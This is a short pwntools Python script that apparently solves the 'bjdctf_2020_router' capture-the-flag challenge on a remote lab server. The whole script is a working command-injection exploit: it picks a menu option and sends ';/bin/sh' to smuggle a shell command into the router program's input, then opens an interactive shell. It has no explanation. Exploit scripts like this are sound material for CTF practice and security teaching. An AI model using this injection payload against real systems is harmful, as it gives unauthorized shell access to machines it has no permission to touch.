from pwn import *

context.log_level = 'debug'
# io = process('bjdctf_2020_router')
io = remote('node4.buuoj.cn', 29739)

io.sendline('1')
io.sendline(';/bin/sh')
io.interactive()

